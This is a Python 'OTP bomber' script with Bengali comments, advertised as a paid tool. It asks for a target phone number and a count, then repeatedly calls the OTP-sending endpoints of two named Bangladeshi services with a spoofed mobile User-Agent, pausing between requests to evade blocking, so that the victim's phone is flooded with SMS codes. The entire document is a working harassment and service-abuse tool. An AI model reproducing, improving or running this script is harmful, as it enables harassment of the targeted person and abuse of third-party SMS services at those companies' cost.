import requests, os, time, uuid

def start():
    os.system('clear')
    # আপনার পছন্দের স্টাইলিশ রঙিন ব্যানার (META)
    print('\033[1;31m███\033[1;32m███\033[1;33m██\033[1;34m██\033[1;35m██\033[1;36m██\033[1;37m██\033[1;32m██')
    print('██\033[1;33m█\033[1;34m██\033[1;35m█\033[1;36m██\033[1;31m  ██\033[1;32m██  \033[1;33m██')
    print('██ \033[1;34m█\033[1;35m ██\033[1;36m  ██\033[1;31m  ██\033[1;32m  ██')
    print('██   \033[1;31m██\033[1;32m  ██\033[1;33m  ██\033[1;34m  ██\033[0m')
    
    # আপনার দেওয়া তথ্য অনুযায়ী বক্স
    line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
    print(line)
    print('\033[1;34m| [✓] DEVELOPED BY : MD MALEK ISLAM         |')
    print('| [✓] TEAM         : X-BOOM TEAM            |')
    print('| [✓] TOOL STATUS  : OTP BOMBER (META)      |')
    print('| [✓] TELEGRAM     : @md_malek              |')
    print('| [✓] GITHUB       : MR-MALAK               |')
    print('| [✓] TOOL VERSION : MAX PRO 2026           |\033[0m')
    print(line)
    
    # কি (Key) জেনারেটর শেষে আপনার নামসহ
    u_key = str(uuid.uuid4())[:8]
    print(f'\033[1;32m[❤️] POWERFUL TOOL 10 DAYS ONLY 50TK')
    print(f'[❤️] KEY : {u_key}-MR-MALAK\033[0m')
    print(line)

    target = input('\n\033[1;32m[+] ENTER TARGET NUMBER: \033[0m')
    amount = int(input('\033[1;32m[+] ENTER SMS AMOUNT: \033[0m'))
    
    # ১০০% সচল এবং আপডেট API (Bdtickets + Shikho)
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
    }

    print(f'\n\033[1;32m[✓] ATTACK STARTED ON ==> {target}\033[0m\n')

    for i in range(1, amount + 1):
        try:
            # API 1: Bdtickets (High Speed)
            requests.post("https://api.bdtickets.com/api/v1/otp/send", json={"mobileNumber": target}, headers=headers, timeout=10)
            
            # API 2: Shikho (Updated)
            requests.post("https://api.shikho.com/api/v1/auth/send-otp", json={"phone": target, "type": "login"}, headers=headers, timeout=10)
            
            print(f'\033[1;32m[{i}] META SUCCESS SENT ==> {target}\033[0m')
        except:
            print(f'\033[1;31m[{i}] META FAILED SENT ==> {target}\033[0m')
        
        # ব্লকিং এড়াতে ৪ সেকেন্ড বিরতি
        time.sleep(4)

if __name__ == "__main__":
    start()
